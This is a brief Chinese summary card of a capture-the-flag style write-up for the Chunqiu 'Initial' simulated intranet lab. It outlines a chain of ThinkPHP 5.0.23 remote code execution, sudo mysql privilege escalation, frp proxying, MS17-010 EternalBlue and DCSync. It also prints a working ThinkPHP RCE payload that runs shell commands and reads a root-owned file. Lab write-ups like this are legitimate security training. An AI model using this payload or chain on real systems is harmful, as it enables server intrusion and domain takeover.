---
title: "春秋云境仿真场景WP：Initial"
category: web
tags: ["春秋云境仿真场景", "web", "ThinkPHP 5.0.23", "sudo mysql提权", "frp代理", "MS17-010"]
signals: ["春秋云境仿真场景 2024", "ThinkPHP 5.0.23", "sudo mysql提权", "frp代理", "MS17-010", "DCSync", "内网渗透", "rce", "Initial", "ThinkPHP5", "RCE", "sudo", "mysql"]
difficulty: easy
source: "https://www.ctfiot.com/184189.html"
tools: ["ThinkPHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋云境仿真场景WP：Initial

> 赛事：春秋云境仿真场景 2024 | 方向：web | 难度：easy | 工具：ThinkPHP

## 一句话总结

春秋云境Initial仿真场景：ThinkPHP5 RCE+MS17-010+DCSync三段式内网

## 攻击链

1. ThinkPHP5.0.23 RCE→sudo mysql -e读flag1→frp代理→MS17-010打172.22.1.21→DCSync域管hash→crackmapexec读flag3

## 关键 payload

```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;sudo mysql -e '! cat /root/flag/flag01.txt';ms17_010_eternalblue
```

## 经验教训

入门级内网靶场核心三件套：web RCE入口→MSF永恒之蓝→DCSync域控

## 标签

ThinkPHP 5.0.23、sudo mysql提权、frp代理、MS17-010、DCSync、内网渗透

## 参考来源

- https://www.ctfiot.com/184189.html
- 原文件：春秋云境仿真场景WP：Initial.full.md
